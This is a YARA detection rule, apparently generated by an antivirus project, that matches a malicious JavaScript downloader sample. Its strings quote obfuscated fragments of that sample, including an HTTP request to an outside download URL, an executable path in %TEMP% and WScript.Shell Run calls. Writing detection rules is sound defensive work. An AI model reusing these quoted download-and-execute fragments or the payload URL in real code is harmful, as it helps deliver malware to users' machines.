rule sig_20160328_f74180cec0bee5bab5df1e0b8e0a5824 {
  meta:
    description = "datamaliciousorder - file 20160328_f74180cec0bee5bab5df1e0b8e0a5824.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1ebaad7dd18fa7ada9eaab9f97c364f821dcab736821efda499de69cc36b14e8"

  strings:
    $s1  = "function Gmtjtthltb() {return Qsiaimyf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"pCq9UiPpVLJdxsP.exe\";};" fullword ascii
    $s2  = "Hplajws[Pfrlbdtcr](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Gmtjozebvo](Fejufvb() * 11)} while (Hplajws[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qsiaimyf = function Djjrrtrtz() {return WScript[Sbhmsoovb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Erjgltavn(Mlpvqd, Jdidcxaf){return Mlpvqd - Jdidcxaf;};" fullword ascii
    $s6  = "function Wzewdcmyl(Yedhqk){Qsiaimyf[\"Run\"](Yedhqk, Gvnoqu, Gvnoqu);};" fullword ascii
    $s7  = " while (Qcmdq){" fullword ascii
    $s8  = "function Emevwnv() {return ((Moomzgou == true) && (Moomzgou == Tyyrxzoo)) ? 1 : Gvnoqu;};" fullword ascii
    $s9  = "var Eowzkda = false;" fullword ascii
    $s10 = "function Rxbdqkqnw(){return Shrhvbim;};" fullword ascii
    $s11 = "function Azlopaisx(Aqvfsrwfqg) {var Mqtmeinkur = (1, 2, 3, 4, 5, Aqvfsrwfqg); return Mqtmeinkur;};" fullword ascii
    $s12 = "Moomzgou = true; " fullword ascii
    $s13 = "var Moomzgou = false;" fullword ascii
    $s14 = "function Gujcvxm(){return Sbhmsoovb;};" fullword ascii
    $s15 = "var Tyyrxzoo = false;" fullword ascii
    $s16 = "Tyyrxzoo = true; " fullword ascii
    $s17 = "var Lmirli = new this[\"Date\"]();" fullword ascii
    $s18 = "function Fejufvb(){return 22;};" fullword ascii
    $s19 = "function Hntuvba()" fullword ascii
    $s20 = "return Erjgltavn(Mgstxnp, Aitfsy);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}